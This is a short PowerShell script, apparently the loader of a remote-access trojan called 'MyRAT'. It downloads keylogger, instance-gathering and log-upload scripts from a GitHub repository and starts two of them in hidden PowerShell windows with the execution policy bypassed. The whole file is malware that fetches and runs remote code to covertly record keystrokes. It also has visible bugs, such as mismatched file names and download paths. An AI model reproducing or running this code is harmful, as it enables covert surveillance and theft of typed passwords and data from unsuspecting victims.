
$scriptPath = "$env:temp\keylogger"
Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/keylogger.ps1" -OutFile keylogger.ps1
Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/getInst.ps1" -OutFile getInst.ps1
Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/uploadLog.ps1" -OutFile getInst.ps1
Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath\keylogger.ps1`"" -WindowStyle Hidden
Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath\getInst.ps1`"" -WindowStyle Hidden
